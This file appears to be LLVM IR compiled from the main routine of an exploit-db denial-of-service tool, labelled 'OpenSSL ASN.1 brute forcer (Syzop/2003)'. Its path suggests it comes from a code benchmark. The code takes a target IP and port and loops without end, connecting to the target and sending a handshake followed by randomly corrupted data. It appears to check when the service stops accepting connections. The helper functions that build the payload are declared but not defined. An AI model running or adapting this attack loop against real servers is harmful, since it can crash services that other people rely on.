; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_146.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_146.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.timeval = type { i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [42 x i8] c"OpenSSL ASN.1 brute forcer (Syzop/2003)\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"Use: %s [ip] [port]\0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"Port out of range (%d)\0A\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"seed = %u\0A\00", align 1
@SIGPIPE = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [18 x i8] c"Socket error: %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [23 x i8] c"Unable to connect: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@buf = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.timeval, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 1, i32* %9, align 4
  store i8* null, i8** %11, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 3
  br i1 %16, label %17, label %24

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  store i8* %27, i8** %11, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %8, align 4
  %32 = load i32, i32* %8, align 4
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %37, label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %8, align 4
  %36 = icmp sgt i32 %35, 65535
  br i1 %36, label %37, label %42

37:                                               ; preds = %34, %24
  %38 = load i32, i32* @stderr, align 4
  %39 = load i32, i32* %8, align 4
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %38, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 %39)
  %41 = call i32 @exit(i32 1) #3
  unreachable

42:                                               ; preds = %34
  %43 = call i32 @gettimeofday(%struct.timeval* %13, i32* null)
  %44 = call i32 (...) @getpid()
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = xor i32 %44, %46
  %48 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  %49 = load i32, i32* %48, align 4
  %50 = mul nsw i32 %49, 1000
  %51 = add nsw i32 %47, %50
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %12, align 4
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i32 %52)
  %54 = load i32, i32* %12, align 4
  %55 = call i32 @srand(i32 %54)
  %56 = call i32 @memset(%struct.sockaddr_in* %6, i32 0, i32 12)
  %57 = load i32, i32* @SIGPIPE, align 4
  %58 = load i32, i32* @SIG_IGN, align 4
  %59 = call i32 @signal(i32 %57, i32 %58)
  br label %60

60:                                               ; preds = %42, %98
  %61 = load i32, i32* @AF_INET, align 4
  %62 = load i32, i32* @SOCK_STREAM, align 4
  %63 = call i32 @socket(i32 %61, i32 %62, i32 0)
  store i32 %63, i32* %7, align 4
  %64 = icmp slt i32 %63, 0
  br i1 %64, label %65, label %72

65:                                               ; preds = %60
  %66 = load i32, i32* @stderr, align 4
  %67 = load i32, i32* @errno, align 4
  %68 = call i8* @strerror(i32 %67)
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %66, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i8* %68)
  %70 = load i32, i32* @EXIT_FAILURE, align 4
  %71 = call i32 @exit(i32 %70) #3
  unreachable

72:                                               ; preds = %60
  %73 = load i32, i32* @AF_INET, align 4
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %73, i32* %74, align 4
  %75 = load i32, i32* %8, align 4
  %76 = call i32 @htons(i32 %75)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %76, i32* %77, align 4
  %78 = load i8*, i8** %11, align 8
  %79 = call i32 @inet_addr(i8* %78)
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %80, i32 0, i32 0
  store i32 %79, i32* %81, align 4
  %82 = load i32, i32* %7, align 4
  %83 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %84 = call i64 @connect(i32 %82, %struct.sockaddr* %83, i32 12)
  %85 = icmp slt i64 %84, 0
  br i1 %85, label %86, label %98

86:                                               ; preds = %72
  %87 = load i32, i32* @stderr, align 4
  %88 = load i32, i32* @errno, align 4
  %89 = call i8* @strerror(i32 %88)
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %87, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0), i8* %89)
  %91 = load i32, i32* %9, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %95, label %93

93:                                               ; preds = %86
  %94 = call i32 (...) @diffit()
  br label %95

95:                                               ; preds = %93, %86
  %96 = load i32, i32* @EXIT_FAILURE, align 4
  %97 = call i32 @exit(i32 %96) #3
  unreachable

98:                                               ; preds = %72
  store i32 0, i32* %9, align 4
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  %100 = load i32, i32* @stdout, align 4
  %101 = call i32 @fflush(i32 %100)
  %102 = call i32 (...) @send_hello()
  store i32 %102, i32* %10, align 4
  %103 = load i32, i32* %7, align 4
  %104 = load i32, i32* @buf, align 4
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @write(i32 %103, i32 %104, i32 %105)
  %107 = call i32 (...) @send_crap()
  store i32 %107, i32* %10, align 4
  %108 = load i32, i32* @buf, align 4
  %109 = load i32, i32* %10, align 4
  %110 = call i32 @corruptor(i32 %108, i32 %109)
  %111 = load i32, i32* %7, align 4
  %112 = load i32, i32* @buf, align 4
  %113 = load i32, i32* %10, align 4
  %114 = call i32 @write(i32 %111, i32 %112, i32 %113)
  %115 = call i32 @usleep(i32 1000)
  %116 = load i32, i32* %7, align 4
  %117 = call i32 @close(i32 %116)
  br label %60
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @gettimeofday(%struct.timeval*, i32*) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @diffit(...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @send_hello(...) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @send_crap(...) #1

declare dso_local i32 @corruptor(i32, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
